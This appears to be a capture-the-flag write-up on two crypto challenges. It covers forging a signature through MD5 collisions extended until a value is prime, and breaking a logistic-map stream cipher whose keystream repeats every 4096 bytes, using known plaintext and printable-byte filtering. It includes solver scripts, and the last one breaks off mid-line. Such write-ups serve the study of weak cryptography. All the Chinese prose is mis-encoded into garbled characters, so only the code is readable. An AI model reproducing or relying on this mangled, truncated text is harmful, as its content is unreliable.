·é‡ç½®åéªŒè¯çš„GCD(password,a)åªèƒ½æ˜¯1ï¼Œå¾—ä¸åˆ°å…¨éƒ¨çš„flagã€‚å› æ­¤è€ƒè™‘ä¼ªé€ ç­¾åã€‚ç­¾åä¹‹å‰å¯¹æ¶ˆæ¯è¿›è¡Œäº†ä¸€æ¬¡md5ï¼Œå¯ä»¥æ‰¾ä¸¤ä¸²md5ç›¸åŒçš„å­—èŠ‚b1å’Œb2ï¼Œbytes_to_long(b1)æ˜¯è´¨æ•°ï¼Œbytes_to_long(b2)æ˜¯åˆæ•°ï¼Œè¿™æ ·å¯ä»¥å°†å¯†ç ä¿®æ”¹ä¸ºbytes_to_long(b1)ï¼Œaä¿®æ”¹ä¸ºbytes_to_long(b2)çš„ä¸€ä¸ªç¨å¤§çš„å› å­ï¼Œè¾“å…¥å¯†ç æ—¶è¾“å…¥bytes_to_long(b2)ï¼Œå³å¯æ³„éœ²æ›´å¤šä½ã€‚\nç”±äºb1å’Œb2çš„md5ç›¸åŒï¼Œå› æ­¤å¯¹äºsm2æ¥è¯´å®ƒä»¬å°±æ˜¯åŒä¸€ä¸ªå€¼ï¼Œè‡ªç„¶å¯ä»¥é€šè¿‡éªŒç­¾ã€‚ä½†æ˜¯å®é™…ä¸Šmd5ç¢°æ’äº§ç”Ÿè‡³å°‘ä¸€ä¸ªè´¨æ•°çš„æ¦‚ç‡å¹¶ä¸å¤§ï¼ˆå¦‚æœçœŸçš„æœ‰å¹¸æŠ½åˆ°äº†ä¸¤ä¸ªè´¨æ•°ï¼Œmd5è¿˜ç›¸åŒï¼Œé‚£è®©å¯†ç æ˜¯å¤§çš„é‚£ä¸ªè´¨æ•°ï¼Œaæ˜¯å°çš„é‚£ä¸ªè´¨æ•°å°±è¡Œäº†ï¼‰ã€‚å¦‚æœåªæ˜¯ä¸æ–­ç”¨fastcollå»ç”Ÿæˆç¢°æ’å¯¹ï¼Œå®æµ‹ä¸å¤ªæœ‰å¸Œæœ›å¾—åˆ°è´¨æ•°ã€‚ä½†æ˜¯ï¼Œmd5å¯ä»¥ä½¿ç”¨é•¿åº¦æ‰©å±•æ”»å‡»ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼ŒåŒä¸€ä¸ªmd5çš„ä¸¤ä¸²å­—èŠ‚ï¼Œåé¢å†åŠ ä¸ŠåŒæ ·çš„å­—èŠ‚ï¼Œmd5ä»ç›¸åŒã€‚å› æ­¤å¯ä»¥åœ¨ä¸€ç»„ç¢°æ’å®ä¾‹çš„æœ«å°¾æ‹¼æ¥ä¸Šä¸€ä¸ªå¥‡æ•°ï¼ŒæœŸæœ›å¾—åˆ°ä¸€ä¸ªè´¨æ•°ã€‚\nfrom Crypto.Util.number import isPrime, bytes_to_long, long_to_bytesimport hashlibx = &quot;4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa200a8284bf36e8e4b55b35f427593d849676da0d1555d8360fb5f07fea2&quot;y = &quot;4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa202a8284bf36e8e4b55b35f427593d849676da0d1d55d8360fb5f07fea2&quot;print(&quot;x : &quot;, bytes_to_long(bytes.fromhex(x)))print(&quot;md5(x) : &quot;, hashlib.md5(bytes.fromhex(x)).hexdigest())print(&quot;md5(y) : &quot;, hashlib.md5(bytes.fromhex(y)).hexdigest())z = 1xx = 0yy = 0while True:    # append 1s till prime    xx = bytes_to_long(bytes.fromhex(x) + long_to_bytes(z))    yy = bytes_to_long(bytes.fromhex(y) + long_to_bytes(z))    if isPrime(xx) or isPrime(yy):        break    z += 2print(&quot;x+z :&quot;, xx)print(&quot;y+z :&quot;, yy)print(&quot;md5(x+z) : &quot;, hashlib.md5(long_to_bytes(xx)).hexdigest())print(&quot;md5(y+z) : &quot;, hashlib.md5(long_to_bytes(yy)).hexdigest())\nçªç„¶æ„Ÿè§‰md5å¾ˆæœ‰æ„æ€ï¼Œæ„é€ ç¢°æ’çš„æ—¶å€™å¯ä»¥æŒ‡å®šå¼€å¤´ï¼Œé•¿åº¦æ‰©å±•æ”»å‡»å¯ä»¥æŒ‡å®šç»“å°¾ï¼Œä¸çŸ¥é“æœ€çŸ­çš„ç¢°æ’å¯¹æœ‰å¤šé•¿ï¼Œåœ¨è¿™ä¸ªé•¿åº¦ä»¥åçš„æ•°æ®å®Œå…¨å¯ä»¥è‡ªå®šä¹‰äº†ï¼Œæƒ³ç»­å•¥å°±ç»­å•¥ã€‚å¦‚æœæŒ‡å®šäº†ä¸­é—´éƒ¨åˆ†çš„è¯ï¼Œè½¬åŒ–æˆå¼€å¤´æˆ–è€…ç»“å°¾å’¯ã€‚è¿™ä¹Ÿæ°æ°è¯´æ˜äº†md5æœ‰å¤šä¹ˆä¸å®‰å…¨ï¼ˆç¬‘ï¼‰\nstream 300ptæ¯”èµ›çš„æ—¶å€™æ²¡åšå‡ºæ¥ï¼Œè™½ç„¶Geminiå’ŒChatGPTå·²ç»æä¾›äº†å¾ˆå¥½çš„æ€è·¯ï¼Œä½†æ˜¯æˆ‘è¿˜æ˜¯è¯¯å…¥äº†æ­§é€”ï¼ˆï¼‰èµ›åç ”ç©¶ä¸€æ™šä¸Šæ‰æ‹¿ä¸‹ã€‚\nfrom decimal import *from Crypto.Util.number import bytes_to_longfrom os import urandomfrom hashlib import sha512from gmssl import sm3, funcfrom random import choicesfrom string import printablefrom tqdm import trangefrom secret import flag, keygetcontext().prec = 100def sm3_hash(msg):    msg = func.bytes_to_list(msg)    hash_value = sm3.sm3_hash(msg)    return bytes.fromhex(hash_value)class RC2147483648:    def __init__(self, seed):        self.state = seed    def getByte(self):        t = str(self.state)        bs = sm3_hash(t.encode())        return bs[-1]    def getSstream(self, n):        ss = b&#x27;&#x27;        for _ in trange(n):            ss += self.getByte().to_bytes(1, &#x27;big&#x27;)            self.next()        return ss    def next(self):        u = Decimal(3.5699456)        self.state = self.state * u * (Decimal(1) - self.state)    def encrypted(self, pt):        out = b&#x27;&#x27;        Sstream = self.getSstream(len(pt))        for i in range(len(msg)):            out += (msg[i] ^ Sstream[i]).to_bytes(1, &#x27;big&#x27;)        return out    def decrypted(self, ct):        &quot;&quot;&quot;        emmm...        &quot;&quot;&quot;encrypter = RC2147483648(key)msg = &quot;&quot;.join(choices(printable, k=1048576)).encode()msg = msg[:len(msg)//2] + b&#x27;\\x00&#x27; + flag + b&#x27;\\x00&#x27; + msg[len(msg)//2:] + b&#x27;\\x00\\x00\\x00\\x00&#x27;ct = encrypter.encrypted(msg)f = open(&#x27;ciphertext&#x27;, &#x27;wb&#x27;)f.write(ct)f.close()\nä¸€ä¸ªç¨€å¥‡å¤æ€ªçš„åŠ å¯†ï¼Œä½¿ç”¨é€»è¾‘æ–¯è°›æ˜ å°„(logistic map)ä»åˆå§‹seedä¸æ–­å¯¼å‡ºä¸‹ä¸€ä¸ªçŠ¶æ€ï¼Œæ¯ä¸ªçŠ¶æ€ç»è¿‡SM3æ•£åˆ—å¾—åˆ°ä¸€ä¸ªå­—èŠ‚ï¼Œå¤§æ¦‚é•¿è¿™æ ·\n\n\\begin{array}{rccccc}\n\\text{State:} & S_0 (\\text{seed}) & \\xrightarrow{S_{n+1}=uS_n(1-S_n)} & S_1 & \\xrightarrow{S_{n+1}=uS_n(1-S_n)} & S_2 & \\xrightarrow{S_{n+1}=uS_n(1-S_n)} & \\dots \\\\\n& \\downarrow\\tiny \\text{sm3, lastbyte}    &  & \\downarrow\\tiny \\text{sm3, lastbyte}    & & \\downarrow\\tiny \\text{sm3, lastbyte}  &   \\\\\n\\text{Key:}   & K_0     &   & K_1    &    & K_2    &&  \\dots\n\\end{array}åŠ å¯†å™¨ä¸æ–­å¾—åˆ°è¿ç»­çš„å­—èŠ‚æµï¼Œå¼‚æˆ–æ˜æ–‡å¾—åˆ°å¯†æ–‡ã€‚å› æ­¤ï¼Œè™½ç„¶å®ƒæ²¡æœ‰ç»™è§£å¯†ç®—æ³•ï¼Œåªè¦æˆ‘ä»¬æœ‰keyï¼Œå®Œå…¨å¯ä»¥è‡ªå·±å°†å¯†é’¥æµç”Ÿæˆå‡ºæ¥ï¼Œå¼‚æˆ–å¾—åˆ°æ˜æ–‡ã€‚ä½†é—®é¢˜æ˜¯æˆ‘ä»¬æ²¡æœ‰keyï¼Œè€Œkeyå¯èƒ½æ˜¯ä¸€ä¸ª100ä½çš„å°æ•°ï¼Œçˆ†ç ´æ˜¯ä¸ç°å®çš„ã€‚\nå°Šè´µçš„ChatGPTå¤§äººæœå¯»åˆ°äº†èµ„æ–™ï¼Œå®ƒæ˜¯è¿™ä¹ˆè¯´çš„\n\nï¼ˆ1ï¼‰åœ¨æœ‰é™ç²¾åº¦ä¸‹ logistic-map ç±» PRNG ä¼šé€€åŒ–å¹¶äº§ç”Ÿå¯ä¼°è®¡çš„å‘¨æœŸ/æ¨¡å¼ã€ï¼ˆ2ï¼‰å·²çŸ¥æ˜æ–‡/å·²çŸ¥ keystream ä½ç½®ä¼šè¢«ç”¨æ¥æ¢å¤åˆå§‹æ¡ä»¶æˆ–å‚æ•°ï¼Œå› æ­¤è¯¥æ–¹æ¡ˆå¹¶éå½¢å¼ä¸Šå®‰å…¨ã€‚\n\nè¿™ä¸ªåŠ å¯†æ–¹æ¡ˆçš„ä¸¤ä¸ªå¯èƒ½çš„å¼±ç‚¹GPTéƒ½æåˆ°äº†ï¼ŒæŒ‰ç…§GPTç»™å‡ºçš„è®ºæ–‡æ¥çœ‹ï¼Œè¿™ç¯‡æ–‡ç« ä¼¼ä¹å¾ˆæœ‰ç”¨ã€‚å®ƒæåŠåœ¨å‚æ•°$3\\lt\\lambda\\lt3.7$æ—¶ï¼Œstateä¼šé™·å…¥å‘¨æœŸï¼Œç³»ç»Ÿæ²¡èƒ½è¡¨ç°å‡ºæ··æ²Œæ€§ã€‚å› æ­¤ï¼Œè¿™ä¸ªåŠ å¯†æ˜¯å‘¨æœŸæ€§çš„å¼‚æˆ–ï¼Œè€Œéä¸€æ¬¡ä¸€å¯†ã€‚è€Œå‘¨æœŸæ€§çš„å¼‚æˆ–åŠ ä¸Šæ˜æ–‡å¯æ‰“å°çš„æ¡ä»¶ï¼Œæ˜¯å¯ä»¥é€ä¸ªä½ç½®å‡å°‘å¯†é’¥ç©ºé—´ï¼Œä¹ƒè‡³æ¢å¤å¯†é’¥çš„ã€‚\næˆ‘ä»¬å°å¿ƒæ±‚è¯ä¸€ä¸‹ï¼Œå¯¹äºç»™å®šçš„å‚æ•°u=3.5699456ï¼Œéšæœºé€‰å–1000ä¸ªç§å­ï¼Œæ¯ä¸ªç§å­ç”Ÿæˆ1048576ä¸ªå­—èŠ‚çš„å¯†é’¥æµï¼ŒéªŒè¯æ˜¯å¦å­˜åœ¨è¾ƒçŸ­çš„å‘¨æœŸã€‚\nimport randomfrom decimal import Decimal, getcontextfrom gmssl.sm3 import sm3, funcfrom tqdm import trange, tqdmgetcontext().prec = 100def sm3_hash(msg):    msg = func.bytes_to_list(msg)    hash_value = sm3.sm3_hash(msg)    return bytes.fromhex(hash_value)class RC2147483648:    def __init__(self, seed):        if not (Decimal(0) &lt; seed &lt; Decimal(1)):            raise ValueError(&quot;Seedå¿…é¡»åœ¨ (0, 1) èŒƒå›´å†…&quot;)        self.state = seed        self.u = Decimal(&#x27;3.5699456&#x27;)    def getByte(self):        t = str(self.state)        bs = sm3_hash(t.encode())        return bs[-1]    def next(self):        self.state = self.state * self.u * (Decimal(1) - self.state)        if not (Decimal(0) &lt; self.state &lt; Decimal(1)):            self.state = Decimal(random.randint(1, 999999)) / Decimal(1000000)        return self.state    def getSstream(self, n):        ss = b&#x27;&#x27;        for _ in trange(n, desc=&quot;Generating S-stream&quot;):            ss += self.getByte().to_bytes(1, &#x27;big&#x27;)            self.next()        return ss    def encrypted(self, pt):        out = b&#x27;&#x27;        Sstream = self.getSstream(len(pt))        for i in range(len(pt)):            out += (pt[i] ^ Sstream[i]).to_bytes(1, &#x27;big&#x27;)        return outdef check_short_cycle(seed, max_iter, period_limit):    &quot;&quot;&quot;    æ£€æŸ¥ç»™å®šç§å­æ˜¯å¦åœ¨ max_iter æ­¥å†…    äº§ç”Ÿä¸€ä¸ªé•¿åº¦å°äº period_limit çš„å¾ªç¯ã€‚    ä½¿ç”¨å­—å…¸æ¥è·Ÿè¸ª &quot;çŠ¶æ€ -&gt; è¿­ä»£æ¬¡æ•°&quot;    &quot;&quot;&quot;    rc = RC2147483648(seed)    states_seen = &#123;&#125;  # å­—å…¸: &#123;state: iteration_number&#125;    for i in range(max_iter):        current_state = rc.next()        if current_state in states_seen:            # å‘ç°å¾ªç¯ï¼            first_seen_at = states_seen[current_state]            cycle_len = i - first_seen_at            if cycle_len &lt; period_limit:                # å‘ç°äº†çŸ­å‘¨æœŸ                return True, cycle_len  # (æ‰¾åˆ°çŸ­å‘¨æœŸ, å‘¨æœŸé•¿åº¦)            else:                # å‘¨æœŸä¸å¤ŸçŸ­ï¼Œä½†ä¹Ÿç®—æ‰¾åˆ°äº†                return False, cycle_len # (æœªæ‰¾åˆ°çŸ­å‘¨æœŸ, å‘¨æœŸé•¿åº¦)                states_seen[current_state] = i    # åœ¨ max_iter æ­¥å†…æœªæ‰¾åˆ°ä»»ä½•å¾ªç¯    return False, None  # (æœªæ‰¾åˆ°çŸ­å‘¨æœŸ, æœªçŸ¥å‘¨æœŸ)def run_test_suite(num_seeds, max_iter, period_limit):    &quot;&quot;&quot;    è¿è¡Œå®Œæ•´çš„æµ‹è¯•å¥—ä»¶    &quot;&quot;&quot;    print(f&quot;--- å¼€å§‹å‘¨æœŸæ€§æµ‹è¯• ---&quot;)    print(f&quot;æµ‹è¯•ç§å­æ•°: &#123;num_seeds&#125;&quot;)    print(f&quot;æœ€å¤§è¿­ä»£æ¬¡æ•°/ç§å­: &#123;max_iter&#125; (2^&#123;int(max_iter.bit_length()-1)&#125;)&quot;)    print(f&quot;çŸ­å‘¨æœŸé˜ˆå€¼: &#123;period_limit&#125; (2^&#123;int(period_limit.bit_length()-1)&#125;)&quot;)    print(f&quot;Decimal ç²¾åº¦: &#123;getcontext().prec&#125; ä½&quot;)    print(&quot;-&quot; * 20)    short_cycle_count = 0    found_cycles = []    # ä½¿ç”¨tqdmæ˜¾ç¤ºæ€»è¿›åº¦    for i in tqdm(range(num_seeds), desc=&quot;Testing Seeds&quot;):        # ç”Ÿæˆä¸€ä¸ªéšæœºçš„ã€é«˜ç²¾åº¦çš„ç§å­ (0, 1)        # æˆ‘ä»¬ç”¨å­—ç¬¦ä¸²æ¥ç¡®ä¿ç²¾åº¦        rand_str = &#x27;0.&#x27; + &#x27;&#x27;.join(random.choices(&#x27;0123456789&#x27;, k=getcontext().prec - 1))        seed = Decimal(rand_str)                # ç¡®ä¿ç§å­æœ‰æ•ˆ        if seed == Decimal(0) or seed == Decimal(1):            continue        try:            is_short, cycle_len = check_short_cycle(seed, max_iter, period_limit)                        if is_short:                short_cycle_count += 1                found_cycles.append((str(seed), cycle_len))                except ValueError as e:            # æ•è· &quot;Seedå¿…é¡»åœ¨ (0, 1) èŒƒå›´å†…&quot; çš„é”™è¯¯ï¼ˆå¦‚æœçŠ¶æ€é€¸å‡ºï¼‰            tqdm.write(f&quot;ç§å­ &#123;str(seed)[:10]&#125;... åœ¨è¿­ä»£ä¸­å¤±æ•ˆ: &#123;e&#125;&quot;)        except Exception as e:            tqdm.write(f&quot;ç§å­ &#123;str(seed)[:10]&#125;... å‘ç”ŸæœªçŸ¥é”™è¯¯: &#123;e&#125;&quot;)    print(&quot;\\n--- æµ‹è¯•ç»“æœ ---&quot;)    print(f&quot;åœ¨ &#123;num_seeds&#125; ä¸ªéšæœºç§å­ä¸­ï¼Œ&quot;)    print(f&quot;**å‘ç° &#123;short_cycle_count&#125; ä¸ªç§å­çš„å‘¨æœŸå°äº &#123;period_limit&#125;ã€‚**&quot;)    if short_cycle_count &gt; 0:        print(&quot;\\nå‘ç°çŸ­å‘¨æœŸçš„ç§å­ï¼ˆéƒ¨åˆ†ç¤ºä¾‹ï¼‰:&quot;)        for seed_str, length in found_cycles[:10]:            print(f&quot;  - ç§å­ (å‰10ä½): &#123;seed_str[:12]&#125;... \\tå‘¨æœŸ: &#123;length&#125;&quot;)if __name__ == &quot;__main__&quot;:    NUM_SEEDS = 1000        # ä½ è¦æ±‚çš„ç§å­æ•°é‡    MAX_ITER = 2**20        # 1,048,576    PERIOD_LIMIT = 2**15    # 32,768    run_test_suite(NUM_SEEDS, MAX_ITER, PERIOD_LIMIT)\nç»è¿‡æµ‹è¯•ï¼Œåœ¨1000æ¬¡å®éªŒä¸­ï¼Œ1000æ¬¡çš„å‘¨æœŸéƒ½å°äº32768ï¼Œè¿›ä¸€æ­¥æµ‹è¯•è¡¨æ˜å‘¨æœŸå‡ä¸º4096ã€‚è¿™è¯´æ˜äº†è™½ç„¶æˆ‘ä»¬ä¸çŸ¥é“é¢˜ç›®ä½¿ç”¨çš„seedï¼Œä½†æ˜¯å¤§æ¦‚ç‡å‘¨æœŸåŒæ ·æ˜¯4096ï¼Œæˆ‘ä»¬æ ¹æ®è¿™ä¸ªå‘¨æœŸè¿›è¡Œç ´è§£ã€‚\næˆ‘ä»¬å·²çŸ¥ï¼šflagå‰åå‡æœ‰ä¸€ä¸ª0x00ï¼Œæ˜æ–‡æœ€åå››ä¸ªå­—èŠ‚æ˜¯0x00ï¼Œå…¶ä½™å­—ç¬¦å‡ä¸ºå¯æ‰“å°å­—ç¬¦ã€‚å› æ­¤ï¼Œå¯¹äºæ¯ä¸ªä½ç½®ï¼Œéå†0åˆ°255ï¼Œå¯¹äºè¿™ä¸ªä½ç½®å¯¹åº”çš„æ‰€æœ‰å¯†æ–‡ï¼Œå¼‚æˆ–è¿™ä¸ªå¯†é’¥åº”è¯¥æ˜¯å¯æ‰“å°æ˜æ–‡ï¼ˆæˆ–è€…åˆšæ‰é‚£å‡ ä¸ªç‰¹å®šçš„ä½ç½®ä¸Šæ˜¯0x00ï¼‰ã€‚å¦‚æœå‡ºç°ä¸å¯æ‰“å°çš„æ˜æ–‡ï¼Œåˆ™è¿™ä¸ªå¯†é’¥ä¸€å®šä¸æ­£ç¡®ã€‚å¯¹äºæœ‰0x00å­˜åœ¨çš„ä½ï¼Œè¿˜æœ‰æ›´é«˜æ•ˆçš„ç­–ç•¥ï¼šç”±äº0x00å¼‚æˆ–ä»»ä½•æ•°éƒ½ä¸æ”¹å˜å¦ä¸€ä¸ªæ•°ï¼Œæ‰€ä»¥è¿™ä¸ªä½ç½®çš„å¯†æ–‡ç›´æ¥å°±æ˜¯å¯†é’¥ã€‚ç»è¿‡å¤§é‡å¯†æ–‡çš„ç­›é€‰ï¼Œæ¯ä¸ªä½ç½®ä¸Šçš„å€™é€‰å¯†é’¥éƒ½ä¸ä¼šå¤ªå¤šã€‚\nç”±äºå¯†æ–‡é•¿ä¸º1048619ï¼Œå¯æ‰“å°çš„éšæœºå­—ç¬¦ä¸²é•¿ä¸º1048576ï¼Œ0x00å…±æœ‰6ä¸ªï¼Œå› æ­¤flagä¸€å…±37ä½ã€‚å› æ­¤æˆ‘ä»¬åªéœ€è¦è¿™37ä¸ªä½ç½®çš„å¯†é’¥å°±è¶³å¤Ÿäº†ï¼Œå…¶ä»–ä½ç½®å³ä½¿å¯†é’¥ä¸èƒ½å®Œå…¨ç¡®å®šä¹Ÿä¸å½±å“ã€‚\néœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå‘¨æœŸä¸º4096å¹¶ä¸ä»£è¡¨ä»ä¸€å¼€å§‹æ•´ä¸ªåŠ å¯†å™¨å°±è¿›å…¥äº†å‘¨æœŸã€‚äº‹å®ä¸Šï¼ŒåŠ å¯†å™¨ä¼šå…ˆè¿è¡Œä¸€æ®µæ—¶é—´æ‰é™·å…¥å¾ªç¯ã€‚å› æ­¤ï¼Œå¯†æ–‡å¼€å¤´çš„æ•°æ®éœ€è¦èˆå¼ƒã€‚åœ¨å°†å°½å¯èƒ½å¤šçš„æ•°æ®çº³å…¥åˆ†æåï¼Œåªæœ‰æœ€å‰çš„172068ä¸ªå­—èŠ‚ä¸èƒ½ä¿ç•™ã€‚å¦‚æœç•™ä¸‹å®ƒä»¬ï¼Œåˆ™ä¼šå¼•èµ·å†²çªï¼Œæ‰¾ä¸åˆ°èƒ½ä½¿æ‰€æœ‰å¯†æ–‡éƒ½å˜æˆå¯æ‰“å°æ˜æ–‡çš„å¯†é’¥äº†ã€‚\n# ç­–ç•¥:# 1. ä½¿ç”¨ KPA (flag&#123;, 0x00s) (çº¦æŸ 1)# 2. ä½¿ç”¨ flag ä¹‹åçš„å¯æ‰“å°æ•°æ® (çº¦æŸ 2a)# 3. ä½¿ç”¨ flag ä¹‹å‰çº¦ 60% çš„å¯æ‰“å°æ•°æ® (çº¦æŸ 2b)# 4. åœ¨é€’å½’æ±‚è§£æ—¶ï¼Œå‡è®¾ flag ä¸»ä½“ä¹Ÿæ˜¯å¯æ‰“å°çš„ (çº¦æŸ 3)# 5. åªæ±‚è§£ flag ä¸»ä½“å¿…éœ€çš„å¯†é’¥import stringimport sysfrom tqdm import tqdmfrom math import prod# --- å¸¸é‡ ---CT_FILE = &#x27;ciphertext&#x27;PERIOD = 4096def main():    print(f&quot;[*] æ­£åœ¨åŠ è½½å¯†æ–‡æ–‡ä»¶: &#123;CT_FILE&#125;&quot;)    try:        with open(CT_FILE, &#x27;rb&#x27;) as f:            ct = f.read()        L_ct = len(ct)        print(f&quot;[*] å¯†æ–‡åŠ è½½æˆåŠŸï¼Œæ€»é•¿åº¦: &#123;L_ct&#125; å­—èŠ‚&quot;)    except FileNotFoundError:        print(f&quot;[!] é”™è¯¯: å¯†æ–‡æ–‡ä»¶ &#x27;&#123;CT_FILE&#125;&#x27; æœªæ‰¾åˆ°ã€‚&quot;)        sys.exit(1)    # --- 1. å®šä¹‰æ‰€æœ‰å¸¸é‡å’ŒèŒƒå›´ ---    L_RANDOM_MSG_TOTAL = 1048576    L_RANDOM_PART1 = L_RANDOM_MSG_TOTAL // 2  # 524288    L_KNOWN_PLAINTEXT_BYTES = 6    L_flag = L_ct - L_RANDOM_MSG_TOTAL - L_KNOWN_PLAINTEXT_BYTES    if L_flag &lt; 0:        print(f&quot;[!] é”™è¯¯: å¯†æ–‡é•¿åº¦ &#123;L_ct&#125; å¤ªçŸ­ã€‚&quot;)        sys.exit(1)    print(f&quot;[*] å‘¨æœŸ $p=&#123;PERIOD&#125;$ã€‚æ¨æ–­: len(flag) = &#123;L_flag&#125; å­—èŠ‚&quot;)    L_CONTAMINANT_MID = L_flag + 2    # `flag` çš„èŒƒå›´ (ä¸åŒ…æ‹¬ b&#x27;\\x00flag&#123;&#x27;)    flag_body_start_idx = L_RANDOM_PART1 + 1 + 5  # 5 for &#x27;flag&#123;&#x27;    flag_body_end_idx = flag_body_start_idx + (L_flag - 5)    flag_body_ct = ct[flag_body_start_idx: flag_body_end_idx]    # èŒƒå›´ 2a : flag ä¹‹åçš„æ•°æ®    slice2_start = L_RANDOM_PART1 + L_CONTAMINANT_MID    slice2_end = L_ct - 4    slice2_range = (slice2_start, slice2_end)    # èŒƒå›´ 2b : flag ä¹‹å‰çš„æ•°æ®    slice1_reliable_start = int(L_RANDOM_PART1 * 0.3281937)  # 524288 * 0.3281937 = 172068ï¼Œè‡³å°‘éœ€è¦æ’é™¤è¿™ä¹ˆå¤šï¼Œå¦åˆ™æ— è§£    slice1_reliable_end = L_RANDOM_PART1    slice1_reliable_range = (slice1_reliable_start, slice1_reliable_end)    print(f&quot;[*] &#x27;çº¦æŸ 2&#x27; å°†ä½¿ç”¨ä¸¤ä¸ªæ•°æ®èŒƒå›´:&quot;)    print(f&quot;    - æš‚æ€å (slice1) èŒƒå›´: &#123;slice1_reliable_range&#125;&quot;)    print(f&quot;    - ç¨³å®š (slice2) èŒƒå›´: &#123;slice2_range&#125;&quot;)    # çº¦æŸ 3 (Printable flag) çš„èŒƒå›´    PRINTABLE_BYTES = set(string.printable.encode(&#x27;ascii&#x27;))    # éšæœºæ•°æ®éƒ¨åˆ†ä¸åŒ…å« 0x00    PRINTABLE_ONLY = PRINTABLE_BYTES - &#123;0&#125; if 0 in PRINTABLE_BYTES else PRINTABLE_BYTES    # --- 2. å»ºç«‹æ‰€éœ€å¯†é’¥çš„å€™é€‰åˆ—è¡¨ ---    # è·å– flag_body (flag&#123;...&#125; ä¸­ ... çš„éƒ¨åˆ†) æ‰€éœ€çš„å¯†é’¥ä½ç½®    flag_body_key_positions = []    for i in range(len(flag_body_ct)):        flag_body_key_positions.append((flag_body_start_idx + i) % PERIOD)    unique_key_positions = set(flag_body_key_positions)    # key_candidates: å­˜å‚¨æ¯ä¸ª *å¿…éœ€* å¯†é’¥ä½ç½®çš„å¯èƒ½å€¼    key_candidates = &#123;pos: set(range(256)) for pos in unique_key_positions&#125;    print(f&quot;[*] Flag ä¸»ä½“ (&#123;len(flag_body_ct)&#125; å­—èŠ‚) ä¾èµ–äº &#123;len(unique_key_positions)&#125; ä¸ªå”¯ä¸€çš„å¯†é’¥å­—èŠ‚ã€‚&quot;)    # --- 3. åº”ç”¨çº¦æŸ 1 (å·²çŸ¥æ˜æ–‡) ---    print(f&quot;[*] æ­£åœ¨åº”ç”¨â€œçº¦æŸ 1â€(å·²çŸ¥æ˜æ–‡)...&quot;)    known_pt = &#123;&#125;    # b&#x27;\\x00&#x27; at start of flag block    known_pt[L_RANDOM_PART1] = 0x00    # b&#x27;flag&#123;&#x27;    prefix = b&#x27;flag&#123;&#x27;    for i in range(len(prefix)):        known_pt[L_RANDOM_PART1 + 1 + i] = prefix[i]    # b&#x27;\\x00&#x27; at end of flag block    known_pt[L_RANDOM_PART1 + 1 + L_flag] = 0x00    # b&#x27;\\x00\\x00\\x00\\x00&#x27; at end of file    for i in range(4):        known_pt[L_ct - 4 + i] = 0x00    # ç”¨å·²çŸ¥æ˜æ–‡è¿‡æ»¤ key_candidates    for idx, pt_byte in known_pt.items():        pos = idx % PERIOD        if pos in key_candidates:            key_byte = ct[idx] ^ pt_byte            # è¿™æ˜¯ä¸€ä¸ªå¼ºçº¦æŸï¼Œæˆ‘ä»¬åªä¿ç•™è¿™ä¸€ä¸ªå€¼            key_candidates[pos].intersection_update(&#123;key_byte&#125;)    # --- 4. åº”ç”¨çº¦æŸ 2 (Printable msg) ---    print(f&quot;[*] æ­£åœ¨åº”ç”¨â€œçº¦æŸ 2â€(Printable msg parts)...&quot;)    def filter_set_with_byte(guesses_set, ct_byte, constraints_set):        &quot;&quot;&quot;è¾…åŠ©å‡½æ•°ï¼šç”¨ä¸€ä¸ªå¯†æ–‡å­—èŠ‚è¿‡æ»¤ä¸€ä¸ªçŒœæµ‹é›†&quot;&quot;&quot;        # å¦‚æœçŒœæµ‹é›†å·²ç»åªæœ‰ä¸€ä¸ªå€¼ï¼Œå°±è·³è¿‡        if len(guesses_set) &lt;= 1:            return        current_guesses = guesses_set.copy()        for k_guess in current_guesses:            # éšæœºæ•°æ®ä¸åŒ…å« 0x00ï¼Œæ‰€ä»¥ä½¿ç”¨ PRINTABLE_ONLY            if (ct_byte ^ k_guess) not in PRINTABLE_ONLY:                guesses_set.remove(k_guess)    # éå†æ‰€æœ‰éœ€è¦çš„å¯†é’¥ä½ç½®    for pos in tqdm(key_candidates.keys(), desc=&quot;Filtering keys&quot;):        if len(key_candidates[pos]) == 1:            continue        # éå† msg_part1 (å 60%)        start_idx = slice1_reliable_range[0]        end_idx = slice1_reliable_range[1]        # (é«˜æ•ˆéå†, ä» &#x27;pos&#x27; åœ¨èŒƒå›´å†…çš„ç¬¬ä¸€ä¸ªç´¢å¼•å¼€å§‹)        first_i = start_idx + (pos - start_idx) % PERIOD        for i in range(first_i, end_idx, PERIOD):            filter_set_with_byte(key_candidates[pos], ct[i], PRINTABLE_ONLY)        # éå† msg_part2        start_idx = slice2_range[0]        end_idx = slice2_range[1]        first_i = start_idx + (pos - start_idx) % PERIOD        for i in range(first_i, end_idx, PERIOD):            filter_set_with_byte(key_candidates[pos], ct[i], PRINTABLE_ONLY)    # --- 5. æ£€æŸ¥ç»“æœå¹¶è¿›è¡Œæš´åŠ›ç ´è§£ ---    print(&quot;\\n[*] çº¦æŸåº”ç”¨å®Œæˆã€‚æ­£åœ¨æ£€æŸ¥å‰©ä½™å¯èƒ½æ€§...&quot;)    total_solutions = 1    has_contradiction = False    unresolved_keys = &#123;&#125;  # å­˜å‚¨å¤šè§£çš„å¯†é’¥    for pos in unique_key_positions:        count = len(key_candidates[pos])        if count == 0:            print(f&quot;[!] è‡´å‘½é”™è¯¯: å¯†é’¥ä½ç½® &#123;pos&#125; æ²¡æœ‰å¯èƒ½çš„è§£ï¼(å‡ºç°çŸ›ç›¾)&quot;)            has_contradiction = True        elif count &gt; 1:            print(f&quot;[!] è­¦å‘Š: å¯†é’¥ä½ç½® &#123;pos&#125; ä»æœ‰ &#123;count&#125; ä¸ªè§£&quot;)            unresolved_keys[pos] = count        # ä½¿ç”¨ math.prod æ¥é¿å…æµ®ç‚¹æ•°é—®é¢˜        total_solutions = prod([len(key_candidates[pos]) for pos in unique_key_positions])    if has_contradiction:        print(&quot;[!] æ— æ³•è§£å¯†ã€‚è¯·æ£€æŸ¥å‘¨æœŸæˆ–å·²çŸ¥æ˜æ–‡/æš‚æ€å‡è®¾ã€‚&quot;)        sys.exit(1)    print(f&quot;[*] æ€»å¯èƒ½æ€§ç©ºé—´: &#123;total_solutions&#125; ä¸ªè§£ã€‚&quot;)    if total_solutions &gt; 500000:  # è®¾ç½®ä¸€ä¸ªå®‰å…¨é˜ˆå€¼        print(&quot;[!] 